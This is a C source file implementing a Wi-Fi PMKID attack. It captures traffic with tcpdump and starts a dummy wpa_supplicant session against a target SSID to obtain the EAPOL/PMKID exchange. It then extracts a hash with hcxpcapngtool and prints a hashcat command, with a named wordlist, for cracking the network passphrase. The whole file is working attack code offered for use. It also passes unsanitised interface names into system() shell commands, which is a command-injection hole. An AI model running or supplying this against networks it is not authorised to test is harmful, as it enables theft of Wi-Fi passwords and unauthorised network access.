#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>

// Flag to control execution
volatile int running = 1;

// Signal handler
static void handle_signal(int sig) {
    running = 0;
}

// Execute a command and return its PID
static pid_t execute_command(const char *command) {
    pid_t pid = fork();
    
    if (pid == 0) {
        // Child process
        execlp("/bin/sh", "/bin/sh", "-c", command, NULL);
        
        // If we reach here, execlp failed
        perror("Failed to execute command");
        exit(1);
    }
    
    return pid;
}

void pmkid_attack(const char *mon_interface, const char *mng_interface, const char* ssid)
{
    char pcap_file[64];
    snprintf(pcap_file, sizeof(pcap_file), "pmkid%d.pcap", getpid());
    
    // Set up signal handler
    signal(SIGINT, handle_signal);
    
    // Build tcpdump command
    char tcpdump_cmd[512];
    snprintf(tcpdump_cmd, sizeof(tcpdump_cmd), 
             "tcpdump -i %s -w %s", 
             mon_interface, pcap_file);
    
    // Start packet capture
    printf("Starting packet capture...\n");
    pid_t tcpdump_pid = execute_command(tcpdump_cmd);
    if (tcpdump_pid <= 0) {
        fprintf(stderr, "Failed to start tcpdump\n");
        return;
    }
    
    // Give tcpdump a moment to start
    sleep(2);
    
    // Create temporary wpa_supplicant configuration
    char config_path[64];
    snprintf(config_path, sizeof(config_path), "/tmp/wpa_temp_%d.conf", getpid());
    
    FILE *config_file = fopen(config_path, "w");
    if (!config_file) {
        perror("Failed to create config file");
        kill(tcpdump_pid, SIGTERM);
        return;
    }
    
    // Write minimal configuration
    fprintf(config_file, "network={\n");
    fprintf(config_file, "    ssid=\"%s\"\n", ssid);
    fprintf(config_file, "    scan_ssid=1\n");
    fprintf(config_file, "    key_mgmt=WPA-PSK\n");
    fprintf(config_file, "    proto=RSN\n");
    fprintf(config_file, "    pairwise=CCMP\n");
    fprintf(config_file, "    group=CCMP\n");
    fprintf(config_file, "    psk=\"********\"\n");
    fprintf(config_file, "}\n");
    
    fclose(config_file);
    
    // Start wpa_supplicant
    char wpa_cmd[512];
    snprintf(wpa_cmd, sizeof(wpa_cmd), 
             "wpa_supplicant -i %s -c %s -B", 
             mng_interface, config_path);

    printf("Starting authentication process...\n");
    system(wpa_cmd);
    
    // Wait for EAPOL exchange
    printf("Waiting for EAPOL exchange (10 seconds)...\n");
    sleep(10);
    
    // Kill wpa_supplicant to abort connection
    printf("Stopping authentication process...\n");
    system("pkill wpa_supplicant");
    
    // Allow tcpdump to finish capturing
    sleep(2);
    
    // Stop tcpdump
    printf("Stopping packet capture...\n");
    system("pkill tcpdump");
    
    // Clean up temp file
    unlink(config_path);
    
    printf("Capture completed. Check %s for EAPOL packets.\n", pcap_file);

    //Invoke the hcxpcapngtool
    char hash_file[64];
    snprintf(hash_file, sizeof(hash_file), "pmkid%d.hash", getpid());

    char hcx_cmd[256];
    snprintf(hcx_cmd, sizeof(hcx_cmd), 
             "hcxpcapngtool -o %s %s > /dev/null 2>&1 &", 
             hash_file, pcap_file);
    
    printf("Running: %s\n", hcx_cmd);
    system(hcx_cmd);

    //Crack the hash
    printf("PMKID found, saved in %s\n", hash_file);
    printf("To crack them: you can run:\n\thashcat -m 22000 %s <wordlist>\n -o <outfile>", hash_file);
    printf("Example:\n\thashcat -m 22000 %s /usr/share/wordlists/rockyou-15.txt -o pmkid%d_cracked.txt\n", hash_file, getpid());
    
    return;
}